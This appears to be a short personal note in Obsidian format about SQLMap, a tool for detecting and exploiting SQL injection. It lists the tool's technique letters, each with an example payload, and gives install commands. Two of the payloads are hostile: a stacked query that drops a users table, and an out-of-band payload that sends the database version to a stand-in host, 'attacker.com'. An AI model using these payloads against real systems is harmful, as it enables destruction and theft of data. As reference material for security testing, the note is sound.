```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a tool for automating the process of detecting and exploiting SQLi vulnerabilities. It supports a plethora of databases types and the following techniques:
- `B` : Boolean-based blind - `AND 1=1`
- `E` : Error-based - `AND GTID_SUBSET(@@version,0)`
- `U` : Union query-based - `UNION ALL SELECT 1,@@version,3`
- `S` : Stacked queries - `; DROP TABLE users`
- `T` : Time-based blind - `AND 1=IF(2>1,SLEEP(5),0)`
- `Q` : Inline queries - `(SELECT @@version)`
- ` ` : Out-of-band injection - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Installation
```
sudo apt install sqlmap

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/sqlmapproject/sqlmap
## Usage
